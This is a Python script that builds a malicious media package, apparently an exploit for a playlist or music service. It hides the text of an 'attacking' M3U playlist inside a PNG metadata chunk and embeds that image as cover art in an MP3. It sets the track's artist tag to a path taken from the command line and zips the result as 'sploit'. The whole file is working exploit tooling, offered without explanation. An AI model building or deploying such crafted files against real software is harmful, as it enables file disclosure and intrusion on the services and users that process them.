from pydub import AudioSegment
import os.path
import shutil
import sys
from PIL import Image
from PIL.PngImagePlugin import PngInfo


def create_track(track_name, image_path, tags):
    proto_track = AudioSegment.from_mp3("proto_track.mp3")
    proto_track.export(
        os.path.curdir + f"/{track_name}", format="mp3", tags=tags,
        parameters=["-i", os.path.curdir + "/" + image_path]
    )


def patch_image():
    with open("proto_image.png", mode="rb") as i:
        img = Image.open(i)

        info = PngInfo()

        with open("attacking_playlist.m3u") as pl:
            text = pl.read()

        info.add_text("attack", text)
        img.save("vuln_image.png", "PNG", pnginfo=info)


def create_playlist_file(path_for_playlist):
    tag = {
            "album": f"",
            "artist": f"{path_for_playlist}",
        }

    playlist_dir = "sploit"
    patch_image()

    os.mkdir(str(playlist_dir))

    create_track(f"{playlist_dir}/track1.mp3", "vuln_image.png", tag)
    shutil.copy("proto_playlist.m3u", f"{playlist_dir}/playlist.m3u")
    shutil.make_archive(f"{playlist_dir}", "zip", str(playlist_dir))
    shutil.rmtree(str(playlist_dir))


create_playlist_file(
    sys.argv[1],
)